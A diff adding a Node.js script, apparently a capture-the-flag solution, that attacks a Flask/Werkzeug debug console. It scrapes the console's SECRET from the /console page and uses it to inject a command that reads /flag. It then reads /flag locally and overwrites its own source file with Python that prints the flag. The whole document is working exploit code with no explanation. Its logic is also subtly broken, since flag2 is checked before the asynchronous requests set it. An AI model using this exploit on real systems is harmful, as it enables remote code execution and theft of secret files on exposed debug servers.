@@ -1,0 +1,45 @@
+var cguess = 'F'
+var http = require('http')
+
+port = 5000
+
+var secret = ""
+var fs = require('fs')
+var flag2 = ""
+
+const regex = /SECRET = ".{20}"/
+http.get(`http://flask:${port}/console`, res => {
+    res.on('data', d => {
+        d = d.toString();
+        const found = d.match(regex);
+        secret = found[0].substring(10, 30);
+        http.get(`http://flask:${port}/console?__debugger__=yes&cmd=print(open(%27%2Fflag%27).readline())&frm=0&s=${secret}`, res => {
+            res.on('data', d => {
+                d = d.toString();
+                flag2 = d.split('\n')[1];
+            });
+        });
+    });
+})
+
+if(flag2[0] == cguess){
+    var path = require('path')
+    var filepath = path.join(__dirname, path.basename(__filename))
+
+    var flagfile = '/flag'
+    var flag = fs.readFileSync(flagfile, {encoding:'utf8', flag:'r'})
+    flag = flag.toString()
+    process.stdout.write(flag)
+
+    const content = `
+    s = ""
+    with open('/flag') as f:
+        s += f.readline()
+    s.strip()
+    print(s, end='')
+    `
+
+    fs.writeFileSync(filepath, content, {encoding:'utf8', flag:'w'})
+}
+
+
